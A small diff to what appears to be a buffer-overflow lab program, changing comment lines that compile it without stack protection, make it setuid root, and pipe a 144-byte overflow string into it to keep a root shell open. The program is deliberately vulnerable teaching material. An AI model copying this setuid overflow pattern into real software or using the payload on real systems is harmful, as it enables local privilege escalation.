@@ -4,10 +4,10 @@
 #define BUF_SIZE 128
 #define KEY 0x61616161
 
-// COMPILE $ gcc -fno-stack-protector bof.c -o bof
-// SETUID  $ sudo chown root:root bof
-//         $ sudo chmod 4755 bof
-// EXPLOIT $ {python3 -c "print('a'*144";cat} | ./bof
+// COMPILE $ gcc -fno-stack-protector bof1.c -o bof1
+// SETUID  $ sudo chown root:root bof1
+//         $ sudo chmod 4755 bof1
+// EXPLOIT $ (python -c "print('a'*144)";cat) | ./bof1
 
 int main(){
     int innocent;
